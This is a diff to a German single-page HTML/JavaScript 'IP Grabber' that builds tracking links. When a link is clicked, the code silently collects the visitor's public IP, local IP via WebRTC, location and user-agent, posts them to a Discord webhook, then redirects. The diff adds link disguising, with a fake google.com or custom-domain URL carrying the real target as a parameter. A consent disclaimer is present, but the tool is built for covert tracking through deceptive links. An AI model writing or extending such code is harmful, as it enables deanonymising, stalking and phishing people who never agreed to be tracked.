@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Grabber · Öffentlich + Geräte-IP</title>
+    <title>IP Grabber · Tarn-URL mit Ziel</title>
     <style>
         body { visibility: hidden; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
         body.admin-mode { visibility: visible; background: #f1f5f9; min-height: 100vh; padding: 20px; color: #0f172a; }
@@ -24,13 +24,16 @@
         .flex-row { display: flex; gap: 12px; align-items: center; flex-wrap: wrap; }
         .note { background: #f8fafc; padding: 8px 12px; border-radius: 12px; font-size: 0.85rem; color: #475569; margin-top: 6px; }
         .mask-note { background: #e6f7ff; border-left: 4px solid #0284c7; padding: 12px 16px; border-radius: 12px; margin: 16px 0; }
+        .status-badge { padding: 4px 12px; border-radius: 30px; font-size: 0.8rem; font-weight: 500; }
+        .status-ok { background: #dcfce7; color: #166534; }
+        .status-error { background: #fee2e2; color: #b91c1c; }
     </style>
 </head>
 <body>
     <div id="adminPanel" style="display:none;">
         <div class="container">
-            <h1>IP‑Logger · Öffentliche + Geräte‑IP</h1>
-            <div class="warning"><strong>⚖️ Nur für Bildungs‑ und Testzwecke mit Einwilligung.</strong><br>Zeigt öffentliche Internet‑IP und (optional) lokale Geräte‑IP.</div>
+            <h1>IP‑Logger · Tarn-URL mit Ziel</h1>
+            <div class="warning"><strong>⚖️ Nur für Bildungs‑ und Testzwecke mit Einwilligung.</strong><br>Die Ziel‑URL kann in der Tarn‑URL eingebettet werden.</div>
             <div class="tabs">
                 <div class="tab active" data-tab="generator">🔗 Link Generator</div>
                 <div class="tab" data-tab="logs">📋 Lokale Logs</div>
@@ -46,7 +49,7 @@
                 
                 <!-- Tarn‑Domain Auswahl -->
                 <div class="form-group">
-                    <label>🎭 Tarn‑Domain (wie soll der Link aussehen?)</label>
+                    <label>🎭 Tarn‑Domain</label>
                     <select id="maskPreset">
                         <option value="">Keine Tarnung (echte URL anzeigen)</option>
                         <option value="https://google.com">google.com</option>
@@ -59,19 +62,24 @@
                         <option value="custom">✨ Eigene Domain angeben</option>
                     </select>
                     <div id="customMaskContainer" style="display:none; margin-top:12px;">
-                        <input type="text" id="customMaskUrl" placeholder="https://deinedomain.de/pfad">
+                        <input type="text" id="customMaskUrl" placeholder="https://deinedomain.de">
                     </div>
-                    <div id="maskPathContainer" style="margin-top:12px;">
-                        <input type="text" id="maskPath" placeholder="optionaler Pfad (z.B. /gewinnspiel)">
-                    </div>
+                </div>
+                <div class="form-group">
+                    <label>📎 Pfad (optional, z.B. /gewinnspiel)</label>
+                    <input type="text" id="maskPath" placeholder="/gewinnspiel">
+                </div>
+                <div class="form-group">
+                    <label><input type="checkbox" id="embedTargetInMask"> 🔗 Ziel‑URL in Tarn‑Link einbetten</label>
+                    <div class="note">Wenn aktiv, wird die Ziel‑URL als Parameter <code>?url=...</code> an die Tarn‑Domain angehängt.</div>
                 </div>
                 
                 <button id="generateBtn">✨ Link generieren</button>
                 <div id="resultPanel" style="display:none; margin-top:28px;">
                     <h3>🔽 Dein Link</h3>
-                    <div><strong>🔗 Echte URL:</strong><div class="url-display" id="realUrlDisplay" style="font-size:0.9rem; opacity:0.8;"></div></div>
-                    <div style="margin-top:16px;"><strong>🎭 Maskierte URL:</strong><div class="url-display" id="maskedUrlDisplay" style="font-weight:500;"></div></div>
-                    <div class="mask-note">⚠️ Der untere Link ist nur Anzeigetext. Der Empfänger klickt auf die echte URL.</div>
+                    <div><strong>🔗 Echte URL (funktioniert):</strong><div class="url-display" id="realUrlDisplay" style="font-size:0.9rem; opacity:0.8;"></div></div>
+                    <div style="margin-top:16px;"><strong>🎭 Maskierte URL (zum Teilen):</strong><div class="url-display" id="maskedUrlDisplay" style="font-weight:500;"></div></div>
+                    <div class="mask-note">⚠️ Der untere Link ist nur Anzeigetext. Der Empfänger klickt auf die echte URL. Verantwortungsvoll nutzen.</div>
                     <div class="flex-row" style="margin-top:16px;">
                         <button class="copy-btn" id="copyMaskedBtn">📋 Tarn‑Link kopieren</button>
                         <button class="secondary" id="copyRealBtn">📋 Echten Link kopieren</button>
@@ -91,7 +99,10 @@
                 <div class="form-group"><label>⏱️ Verzögerung (ms)</label><input type="number" id="delayInput" value="3000"></div>
                 <div class="form-group"><label><input type="checkbox" id="collectUACb" checked> User‑Agent erfassen</label></div>
                 <div class="form-group"><label><input type="checkbox" id="collectLocationCb"> Standort ermitteln (ipapi.co)</label></div>
-                <div class="form-group"><label><input type="checkbox" id="collectLocalIPCb"> 🏠 Geräte‑IP (lokal) via WebRTC ermitteln</label><div class="note">⚠️ Funktioniert nur unter HTTPS. Zeigt die private IP im Heimnetzwerk an.</div></div>
+                <div class="form-group">
+                    <label><input type="checkbox" id="collectLocalIPCb"> 🏠 Geräte‑IP (lokal) via WebRTC ermitteln</label>
+                    <div class="note" id="webrtcStatus"></div>
+                </div>
                 <div class="form-group"><label><input type="checkbox" id="storeLocalCb" checked> Lokal speichern</label></div>
                 <div class="form-group"><label>Standard‑Basis‑URL</label><input type="url" id="defaultBaseUrl"></div>
                 <button id="saveSettingsBtn">💾 Speichern</button>
@@ -103,6 +114,25 @@
             "use strict";
             // ---------- STATE ----------
             let links=[],ipLogs=[],settings={delay:3000,collectUA:true,collectLocation:false,collectLocalIP:false,storeLocal:true,defaultBase:''},currentLinkId=null;
+            let webRTCSupported = false;
+
+            // ---------- WebRTC Check ----------
+            function checkWebRTCSupport(){
+                const hasRTCPeerConnection = typeof RTCPeerConnection !== 'undefined';
+                const isSecure = location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
+                webRTCSupported = hasRTCPeerConnection && isSecure;
+                const statusDiv = document.getElementById('webrtcStatus');
+                if(statusDiv){
+                    if(webRTCSupported){
+                        statusDiv.innerHTML = '<span class="status-badge status-ok">✅ WebRTC verfügbar – lokale IP kann ermittelt werden</span>';
+                    } else {
+                        let reason = '';
+                        if(!hasRTCPeerConnection) reason = 'Browser unterstützt kein WebRTC';
+                        else if(!isSecure) reason = 'Keine HTTPS-Verbindung – WebRTC erfordert HTTPS oder localhost';
+                        statusDiv.innerHTML = `<span class="status-badge status-error">❌ ${reason}</span><br><small>Die lokale IP wird nicht erfasst.</small>`;
+                    }
+                }
+            }
 
             // ---------- UTILS ----------
             function generateId(){return Date.now()+'-'+Math.random().toString(36).substr(2,8);}
@@ -125,6 +155,7 @@
                     document.getElementById('storeLocalCb').checked=settings.storeLocal;
                     document.getElementById('defaultBaseUrl').value=settings.defaultBase||'';
                 }
+                checkWebRTCSupport();
             }
             function saveLinks(){if(settings.storeLocal)localStorage.setItem('ipg_links',JSON.stringify(links));}
             function saveLogs(){if(settings.storeLocal)localStorage.setItem('ipg_logs',JSON.stringify(ipLogs));}
@@ -137,17 +168,18 @@
                 settings.storeLocal=document.getElementById('storeLocalCb').checked;
                 settings.defaultBase=document.getElementById('defaultBaseUrl').value.trim();
                 localStorage.setItem('ipg_settings',JSON.stringify(settings));
+                checkWebRTCSupport();
             }
 
             // ---------- IP-ERMITTLUNG ----------
             async function fetchPublicIP(){try{const r=await fetch('https://api.ipify.org?format=json');return(await r.json()).ip}catch(e){return '0.0.0.0';}}
             async function fetchLocalIP(){
-                if(!settings.collectLocalIP)return null;
+                if(!settings.collectLocalIP || !webRTCSupported) return null;
                 return new Promise((resolve)=>{
                     try{
                         const pc=new RTCPeerConnection({iceServers:[]});
                         pc.createDataChannel('');
-                        pc.createOffer().then(offer=>pc.setLocalDescription(offer)).catch(()=>{});
+                        pc.createOffer().then(offer=>pc.setLocalDescription(offer)).catch(()=>{resolve(null);});
                         pc.onicecandidate=(ice)=>{
                             if(!ice||!ice.candidate||!ice.candidate.candidate)return;
                             const candidate=ice.candidate.candidate;
@@ -167,11 +199,11 @@
             }
             async function fetchLocation(ip){if(!settings.collectLocation)return null;try{const r=await fetch(`https://ipapi.co/${ip}/json/`);const d=await r.json();if(d.error)return null;return `${d.city||'Unbekannt'}, ${d.country_name||''}`.trim();}catch(e){return null;}}
 
-            // ---------- DISCORD SENDEN (mit Geräte-IP) ----------
+            // ---------- DISCORD SENDEN ----------
             async function sendDiscord(webhookUrl, publicIP, localIP, ua, location, linkId, customMsg, label){
                 if(!webhookUrl||!webhookUrl.includes('discord.com/api/webhooks'))return false;
                 const locationText=location?`\n📍 Standort: ${location}`:'';
-                const localIPText=localIP?`\n🏠 Geräte‑IP (lokal): \`${localIP}\``:'';
+                const localIPText=(settings.collectLocalIP && localIP)?`\n🏠 Geräte‑IP (lokal): \`${localIP}\``:'';
                 const labelText=label?`\n👤 Gekennzeichnet als: **${label}**`:'';
                 const description=`${customMsg||'Neuer Klick'}\n\n🌐 Öffentliche IP: \`${publicIP}\`${localIPText}${locationText}${labelText}\n🖥️ User‑Agent: ${ua||'nicht erfasst'}`;
                 const embed={title:"🌍 IP‑Logger",description,color:0x3b82f6,timestamp:new Date().toISOString(),footer:{text:`Link‑ID: ${linkId}`}};
@@ -203,7 +235,7 @@
                     const link=links.find(l=>l.id===linkId);
                     if(link){link.clicks++;link.lastAccess=new Date().toISOString();saveLinks();}
                 }
-                document.body.innerHTML=`<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0f172a;color:#e2e8f0;font-family:system-ui;"><div style="text-align:center;"><h2>Weiterleitung...</h2><div style="width:50px;height:50px;border:5px solid #334155;border-top-color:#38bdf8;border-radius:50%;animation:spin 1s infinite;margin:20px auto;"></div><style>@keyframes spin{to{transform:rotate(360deg)}}</style>${debug?`<p>Öffentliche IP: ${publicIP}<br>Geräte‑IP: ${localIP||'aus'}<br>Standort: ${location||'aus'}<br>Label: ${label||'keine'}</p>`:''}</div></div>`;
+                document.body.innerHTML=`<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0f172a;color:#e2e8f0;font-family:system-ui;"><div style="text-align:center;"><h2>Weiterleitung...</h2><div style="width:50px;height:50px;border:5px solid #334155;border-top-color:#38bdf8;border-radius:50%;animation:spin 1s infinite;margin:20px auto;"></div><style>@keyframes spin{to{transform:rotate(360deg)}}</style>${debug?`<p>Öffentliche IP: ${publicIP}<br>Geräte‑IP: ${localIP||'nicht verfügbar'}<br>Standort: ${location||'aus'}<br>Label: ${label||'keine'}</p>`:''}</div></div>`;
                 document.body.style.visibility='visible';
                 setTimeout(()=>{window.location.href=target;},settings.delay);
                 return true;
@@ -221,6 +253,7 @@
                 presetSelect.addEventListener('change',()=>{
                     customContainer.style.display=presetSelect.value==='custom'?'block':'none';
                 });
+                checkWebRTCSupport();
             }
             function renderLogs(){
                 const tbody=document.getElementById('logsBody');
@@ -232,44 +265,60 @@
                 document.querySelectorAll('.tab').forEach(t=>{t.addEventListener('click',()=>{document.querySelectorAll('.tab,.tab-content').forEach(el=>el.classList.remove('active'));t.classList.add('active');document.getElementById(t.dataset.tab).classList.add('active');})});
                 
                 document.getElementById('generateBtn').addEventListener('click',()=>{
-                    const target=document.getElementById('targetUrl').value.trim();
-                    const webhook=document.getElementById('webhookInput').value.trim();
+                    const target = document.getElementById('targetUrl').value.trim();
+                    const webhook = document.getElementById('webhookInput').value.trim();
                     if(!target||!webhook){alert('Ziel-URL und Webhook erforderlich');return;}
                     if(!webhook.includes('discord.com/api/webhooks')){alert('Ungültige Webhook-URL');return;}
-                    const customMsg=document.getElementById('customMsg').value.trim();
-                    const label=document.getElementById('labelInput').value.trim();
-                    const linkId=generateId();
-                    let base=document.getElementById('baseUrlInput').value.trim();
-                    if(!base)base=settings.defaultBase;
-                    if(!base)base=window.location.origin+window.location.pathname;
-                    if(!base.endsWith('/')&&!base.includes('?'))base+='/';
                     
-                    let maskedUrl='';
-                    const preset=document.getElementById('maskPreset').value;
-                    const path=document.getElementById('maskPath').value.trim();
-                    if(preset==='custom'){
-                        maskedUrl=document.getElementById('customMaskUrl').value.trim();
-                    }else if(preset){
-                        maskedUrl=preset+(path?path:'');
+                    const customMsg = document.getElementById('customMsg').value.trim();
+                    const label = document.getElementById('labelInput').value.trim();
+                    const embedTarget = document.getElementById('embedTargetInMask').checked;
+                    const linkId = generateId();
+                    let base = document.getElementById('baseUrlInput').value.trim();
+                    if(!base) base = settings.defaultBase;
+                    if(!base) base = window.location.origin + window.location.pathname;
+                    if(!base.endsWith('/') && !base.includes('?')) base += '/';
+                    
+                    // Maskierte URL bauen
+                    let maskedUrl = '';
+                    const preset = document.getElementById('maskPreset').value;
+                    const path = document.getElementById('maskPath').value.trim();
+                    
+                    if(preset === 'custom'){
+                        maskedUrl = document.getElementById('customMaskUrl').value.trim();
+                    } else if(preset){
+                        maskedUrl = preset;
                     }
                     
-                    const encodedWh=base64Encode(webhook);
-                    const params=new URLSearchParams();
-                    params.set('id',linkId);params.set('to',target);params.set('wh',encodedWh);
-                    if(customMsg)params.set('msg',base64Encode(customMsg));
-                    if(label)params.set('lbl',base64Encode(label));
-                    const realUrl=base+(base.includes('?')?'&':'?')+params.toString();
+                    if(maskedUrl){
+                        // Pfad anhängen
+                        if(path) maskedUrl += path;
+                        // Ziel-URL einbetten falls gewünscht
+                        if(embedTarget){
+                            const separator = maskedUrl.includes('?') ? '&' : '?';
+                            maskedUrl += separator + 'url=' + encodeURIComponent(target);
+                        }
+                    }
                     
-                    const newLink={id:linkId,target,webhook,customMsg,label,maskedUrl:maskedUrl||null,clicks:0,lastAccess:null};
-                    links.push(newLink);saveLinks();
+                    const encodedWh = base64Encode(webhook);
+                    const params = new URLSearchParams();
+                    params.set('id', linkId);
+                    params.set('to', target);
+                    params.set('wh', encodedWh);
+                    if(customMsg) params.set('msg', base64Encode(customMsg));
+                    if(label) params.set('lbl', base64Encode(label));
+                    const realUrl = base + (base.includes('?')?'&':'?') + params.toString();
                     
-                    document.getElementById('resultPanel').style.display='block';
-                    document.getElementById('realUrlDisplay').textContent=realUrl;
-                    document.getElementById('maskedUrlDisplay').textContent=maskedUrl||realUrl;
-                    document.getElementById('linkIdDisplay').textContent=linkId;
-                    currentLinkId=linkId;
-                    document.getElementById('clickCount').textContent='0';
-                    document.getElementById('lastAccess').textContent='—';
+                    const newLink = {id:linkId, target, webhook, customMsg, label, maskedUrl: maskedUrl||null, clicks:0, lastAccess:null};
+                    links.push(newLink); saveLinks();
+                    
+                    document.getElementById('resultPanel').style.display = 'block';
+                    document.getElementById('realUrlDisplay').textContent = realUrl;
+                    document.getElementById('maskedUrlDisplay').textContent = maskedUrl || realUrl;
+                    document.getElementById('linkIdDisplay').textContent = linkId;
+                    currentLinkId = linkId;
+                    document.getElementById('clickCount').textContent = '0';
+                    document.getElementById('lastAccess').textContent = '—';
                 });
                 
                 document.getElementById('copyMaskedBtn').addEventListener('click',()=>{
@@ -279,23 +328,23 @@
                     navigator.clipboard?.writeText(document.getElementById('realUrlDisplay').textContent).then(()=>alert('Echter Link kopiert!'));
                 });
                 document.getElementById('testOwnBtn').addEventListener('click',()=>{
-                    if(!currentLinkId)return alert('Kein Link generiert.');
+                    if(!currentLinkId) return alert('Kein Link generiert.');
                     window.open(document.getElementById('realUrlDisplay').textContent+'&debug=1','_blank');
                 });
                 document.getElementById('testWebhookBtn').addEventListener('click',async()=>{
-                    const wh=document.getElementById('webhookInput').value.trim();
-                    if(!wh)return alert('Webhook eingeben');
-                    const ok=await sendDiscord(wh,'Test-Public','Test-Local','Test-UA','Test-Standort','test','Testnachricht','TestLabel');
-                    document.getElementById('testResult').textContent=ok?'✅ Erfolg':'❌ Fehler';
+                    const wh = document.getElementById('webhookInput').value.trim();
+                    if(!wh) return alert('Webhook eingeben');
+                    const ok = await sendDiscord(wh, 'Test-Public', 'Test-Local', 'Test-UA', 'Test-Standort', 'test', 'Testnachricht', 'TestLabel');
+                    document.getElementById('testResult').textContent = ok ? '✅ Erfolg' : '❌ Fehler';
                 });
                 
-                document.getElementById('clearLogsBtn').addEventListener('click',()=>{ipLogs=[];saveLogs();renderLogs();});
-                document.getElementById('saveSettingsBtn').addEventListener('click',()=>{saveSettings();alert('Gespeichert');});
+                document.getElementById('clearLogsBtn').addEventListener('click',()=>{ipLogs=[]; saveLogs(); renderLogs();});
+                document.getElementById('saveSettingsBtn').addEventListener('click',()=>{saveSettings(); alert('Gespeichert');});
             }
 
             // ---------- START ----------
             loadStorage();
-            (async function(){if(!(await handleRedirect()))showAdminPanel();})();
+            (async function(){if(!(await handleRedirect())) showAdminPanel();})();
         })();
     </script>
 </body>
